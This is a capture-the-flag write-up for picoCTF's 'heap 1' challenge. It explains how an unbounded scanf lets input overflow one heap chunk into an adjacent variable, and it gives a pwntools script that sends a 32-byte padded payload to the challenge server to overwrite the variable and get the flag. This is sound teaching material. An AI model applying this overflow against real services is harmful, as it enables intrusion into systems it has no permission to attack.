# heap 1

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/439) is a basic heap overflow where we need to change a variable content from `bico` to `pico`.

When we connect to the remote we can see this:

```
Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x653e9e0ad6b0  ->   pico
+-------------+----------------+
[*]   0x653e9e0ad6d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice:
```

Let's look in the source code to see how it deals with the heap.

```c
void init() {
    printf("\nWelcome to heap1!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}
```
```c
void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}
```

# Exploitation

Looking at the heap:

```
+-------------+----------------+
[*] Address   ->   Heap Data
+-------------+----------------+
[*]   0x653e9e0ad6b0  ->   pico
+-------------+----------------+
[*]   0x653e9e0ad6d0  ->   bico
+-------------+----------------+
```

we can see that the `input_data` address is `0x653e9e0ad6b0`, and `safe_var` is at `0x653e9e0ad6d0`. The difference between the two addresses is **32 bytes** in decimal. Also the `scanf` does not check for the input size weach mean we can overide on the `safe_var` and get the flag.

# Solve:

```py

from pwn import *


payload = "1"*32 + "pico"

r = remote("tethys.picoctf.net", 52973)
r.recvuntil(b"Enter your choice:")
r.sendline(b'2')
r.recvuntil(b' buffer:')
r.sendline(payload.encode())
r.recvuntil(b"Enter your choice:")
r.sendline(b'4')
r.interactive()
```